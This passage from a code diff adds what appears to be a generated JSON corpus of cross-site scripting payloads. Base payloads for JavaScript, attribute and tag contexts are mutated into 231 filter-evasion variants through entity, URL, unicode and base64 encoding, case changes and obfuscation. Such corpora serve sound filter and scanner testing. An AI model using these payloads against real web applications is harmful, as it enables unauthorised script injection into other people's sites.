+          "encoding": "none"
+        },
+        {
+          "payload": "<details open ontoggle=`alert`(1)>",
+          "strategy": "obfuscation-template",
+          "encoding": "none"
+        },
+        {
+          "payload": "<details open ontoggle=\\x61\\x6c\\x65\\x72\\x74(1)>",
+          "strategy": "obfuscation-hex-string",
+          "encoding": "none"
+        }
+      ],
+      "mutationCount": 24
+    },
+    {
+      "base": "'-alert(1)-'",
+      "category": "javascript-context",
+      "mutations": [
+        {
+          "payload": "'-alert(1)-'",
+          "strategy": "original",
+          "encoding": "none"
+        },
+        {
+          "payload": "&#39;&#45;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#45;&#39;",
+          "strategy": "html-entity-decimal",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#39;-alert(1)-&#39;",
+          "strategy": "html-entity-partial-decimal",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#x27;&#x2d;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x2d;&#x27;",
+          "strategy": "html-entity-hex",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#x27;-alert(1)-&#x27;",
+          "strategy": "html-entity-partial-hex",
+          "encoding": "html"
+        },
+        {
+          "payload": "\\u0027-alert(1)-\\u0027",
+          "strategy": "unicode-escape",
+          "encoding": "unicode"
+        },
+        {
+          "payload": "\\x27-alert(1)-\\x27",
+          "strategy": "hex-escape",
+          "encoding": "unicode"
+        },
+        {
+          "payload": "data:text/html;base64,Jy1hbGVydCgxKS0n",
+          "strategy": "base64-data-uri",
+          "encoding": "base64"
+        },
+        {
+          "payload": "Jy1hbGVydCgxKS0n",
+          "strategy": "base64",
+          "encoding": "base64"
+        },
+        {
+          "payload": "'-ALERT(1)-'",
+          "strategy": "case-uppercase",
+          "encoding": "none"
+        },
+        {
+          "payload": "'-Alert(1)-'",
+          "strategy": "case-mixed",
+          "encoding": "none"
+        },
+        {
+          "payload": "'-aLeRt(1)-'",
+          "strategy": "case-alternating",
+          "encoding": "none"
+        },
+        {
+          "payload": "\"-alert(1)-\"",
+          "strategy": "quote-double",
+          "encoding": "none"
+        },
+        {
+          "payload": "`-alert(1)-`",
+          "strategy": "quote-backtick",
+          "encoding": "none"
+        },
+        {
+          "payload": "-alert(1)-",
+          "strategy": "quote-none",
+          "encoding": "none"
+        },
+        {
+          "payload": "<!-->'-alert(1)-'",
+          "strategy": "comment-html-before",
+          "encoding": "none"
+        },
+        {
+          "payload": "'-'al'+'ert'(1)-'",
+          "strategy": "obfuscation-concat",
+          "encoding": "none"
+        },
+        {
+          "payload": "'-`alert`(1)-'",
+          "strategy": "obfuscation-template",
+          "encoding": "none"
+        },
+        {
+          "payload": "'-\\x61\\x6c\\x65\\x72\\x74(1)-'",
+          "strategy": "obfuscation-hex-string",
+          "encoding": "none"
+        }
+      ],
+      "mutationCount": 19
+    },
+    {
+      "base": "\"onload=alert(1)//",
+      "category": "attribute-context",
+      "mutations": [
+        {
+          "payload": "\"onload=alert(1)//",
+          "strategy": "original",
+          "encoding": "none"
+        },
+        {
+          "payload": "&#34;&#111;&#110;&#108;&#111;&#97;&#100;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#47;&#47;",
+          "strategy": "html-entity-decimal",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#34;onload=alert(1)//",
+          "strategy": "html-entity-partial-decimal",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#x22;&#x6f;&#x6e;&#x6c;&#x6f;&#x61;&#x64;&#x3d;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x2f;&#x2f;",
+          "strategy": "html-entity-hex",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#x22;onload=alert(1)//",
+          "strategy": "html-entity-partial-hex",
+          "encoding": "html"
+        },
+        {
+          "payload": "%22onload%3Dalert(1)%2F%2F",
+          "strategy": "url-encoding-single",
+          "encoding": "url"
+        },
+        {
+          "payload": "%22onload=alert(1)//",
+          "strategy": "url-encoding-partial",
+          "encoding": "url"
+        },
+        {
+          "payload": "%2522onload%253Dalert(1)%252F%252F",
+          "strategy": "url-encoding-double",
+          "encoding": "url"
+        },
+        {
+          "payload": "\\u0022onload=alert(1)//",
+          "strategy": "unicode-escape",
+          "encoding": "unicode"
+        },
+        {
+          "payload": "\\x22onload=alert(1)//",
+          "strategy": "hex-escape",
+          "encoding": "unicode"
+        },
+        {
+          "payload": "data:text/html;base64,Im9ubG9hZD1hbGVydCgxKS8v",
+          "strategy": "base64-data-uri",
+          "encoding": "base64"
+        },
+        {
+          "payload": "Im9ubG9hZD1hbGVydCgxKS8v",
+          "strategy": "base64",
+          "encoding": "base64"
+        },
+        {
+          "payload": "\"ONLOAD=ALERT(1)//",
+          "strategy": "case-uppercase",
+          "encoding": "none"
+        },
+        {
+          "payload": "\"Onload=Alert(1)//",
+          "strategy": "case-mixed",
+          "encoding": "none"
+        },
+        {
+          "payload": "\"OnLoAd=aLeRt(1)//",
+          "strategy": "case-alternating",
+          "encoding": "none"
+        },
+        {
+          "payload": "'onload=alert(1)//",
+          "strategy": "quote-single",
+          "encoding": "none"
+        },
+        {
+          "payload": "`onload=alert(1)//",
+          "strategy": "quote-backtick",
+          "encoding": "none"
+        },
+        {
+          "payload": "onload=alert(1)//",
+          "strategy": "quote-none",
+          "encoding": "none"
+        },
+        {
+          "payload": "<!-->\"onload=alert(1)//",
+          "strategy": "comment-html-before",
+          "encoding": "none"
+        },
+        {
+          "payload": "\"onload='al'+'ert'(1)//",
+          "strategy": "obfuscation-concat",
+          "encoding": "none"
+        },
+        {
+          "payload": "\"onload=`alert`(1)//",
+          "strategy": "obfuscation-template",
+          "encoding": "none"
+        },
+        {
+          "payload": "\"onload=\\x61\\x6c\\x65\\x72\\x74(1)//",
+          "strategy": "obfuscation-hex-string",
+          "encoding": "none"
+        }
+      ],
+      "mutationCount": 22
+    }
+  ],
+  "totalBasePayloads": 10,
+  "totalMutations": 231,
+  "strategies": [
+    "htmlEntities",
+    "urlEncoding",
+    "unicodeEscapes",
+    "base64",
+    "caseVariations",
+    "quoteSubstitution",
+    "whitespaceVariation",
+    "nullBytes",
+    "comments",
+    "protocolVariation",
+    "obfuscation"
+  ]
+}
